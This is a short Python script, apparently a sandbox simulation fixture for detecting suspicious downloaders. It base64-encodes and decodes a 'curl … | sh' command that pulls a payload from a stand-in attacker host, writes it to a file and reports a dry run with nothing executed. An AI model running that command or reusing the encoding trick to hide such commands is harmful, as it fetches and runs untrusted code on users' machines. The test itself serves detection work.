#!/usr/bin/env python3
import base64
from pathlib import Path

root = Path(__file__).resolve().parents[2]
sandbox = root / "sandbox_runtime" / "suspicious_python_downloader_sim_01"
sandbox.mkdir(parents=True, exist_ok=True)

encoded = base64.b64encode(b"curl -L https://evil.example.invalid/payload.sh | sh").decode("ascii")
decoded = base64.b64decode(encoded).decode("utf-8")

print("[string-only] decoded command:", decoded)
(sandbox / "decoded_command.txt").write_text(decoded + "\n", encoding="utf-8")
print("[dry-run] no subprocess/network execution occurred")
